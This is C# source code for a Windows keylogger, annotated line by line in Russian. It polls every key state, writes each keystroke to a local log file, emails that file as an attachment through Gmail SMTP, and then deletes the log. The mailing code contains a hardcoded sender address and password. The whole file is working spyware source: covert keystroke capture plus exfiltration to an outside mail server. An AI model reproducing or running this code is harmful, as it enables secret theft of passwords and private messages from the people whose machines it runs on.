using System;
using System.IO;
using System.Threading;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using System.Timers;
using System.Net;
using System.Net.Mail;
using System.Threading.Tasks;

namespace KeyLogger
{
    class Program
    {
        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i); //подключили клавиатуру к программе
        private static System.Timers.Timer aTimer;  //объявили функцию с именем aTimer для дальнейшей работы с отправкой на почту
        private static string file = "loger.log";  //привязываем в file путь до логов

        static void Main(string[] args)
        {
            var th = new Thread(Start);  //инициализируем новый поток для функции Start
            th.Start();  //запускаем поток
            aTimer = new System.Timers.Timer(60000);  //объявляем новый таймер с интервалом в 60000 мс (60 секунд)
            aTimer.Elapsed += new ElapsedEventHandler(SendEmailCall);  //с заданным интервалом будет выполняться ивент (вызов функции)
            aTimer.Enabled = true;  //активируем таймер
            Thread.Sleep(62000);  //приостанавливаем поток в функции main для асинхронного выполнения программы и выхода из программы
            File.Delete(file);  //удаляем лог
            Environment.Exit(0);  //подаём команду ОС на закрытие приложения

        }

        private static void SendEmailCall(object sender, ElapsedEventArgs e)  //функция вызова функции (издержки коньюнкции функции таймера и почты)
        {
            SendEmailAsync().GetAwaiter(); //запрос асинхронной функции
        }

        private static async Task SendEmailAsync()  //объявляем функцию отправки письма (для вызова из ивента таймера)
        {

            using (MailMessage mm = new MailMessage("muted.spectre@gmail.com", "muted.spectre@gmail.com")) // от кому
            {
                mm.Subject = "Привет";  //письмо.Заголовок
                mm.Attachments.Add(new Attachment(file));  //письмо.Вложение.Добавить(логи кейлогера)
                using (SmtpClient sc = new SmtpClient("smtp.gmail.com", 587))  //привязываем к sc идентификатор сервера для пересылка google с портом 587
                {
                    sc.EnableSsl = true;  //используем ли мы ssl протокол для шифрования
                    sc.DeliveryMethod = SmtpDeliveryMethod.Network;  //указываем способ доставки письма (по сети)
                    sc.UseDefaultCredentials = false;  //поместить ли данные в кэш
                    sc.Credentials = new NetworkCredential("muted.spectre@gmail.com", "nat0eg34711");  //учетные данные отправителя
                    sc.Send(mm);  //отправить письмо (mm)
                }
            }
        }

        static void Start()
        {

            while (true) //зацикливаем получение данных с клавиатуры 
            {
                Thread.Sleep(100);  //вызов таймера приостановления потока программы в 100 мс (0.1 сек)
                for (int i = 0; i < 255; i++)
                {
                    int keyState = GetAsyncKeyState(i);  //в пременную keyState фиксируем нажатую клавишу
                    if (keyState == 1 || keyState == -32767)
                    {
                        
                        string filename = file;  //создаём новый поток связывая с файлом
                        //инициализируем новый экземпляр для нашего потока filename и оставляем поток открытым
                        StreamWriter sw = new StreamWriter(filename, true);  //инициализируем поток записи в наш поток filename
                        sw.Write((Keys)i + " "); //записывем зарегестрированное нажатие в поток (связанный с файлом)
                        sw.Close(); //закрываем наш поток
                        //Console.WriteLine((Keys)i + " "); //отладочный вывод
                    }
                }
            }
        }
    }
}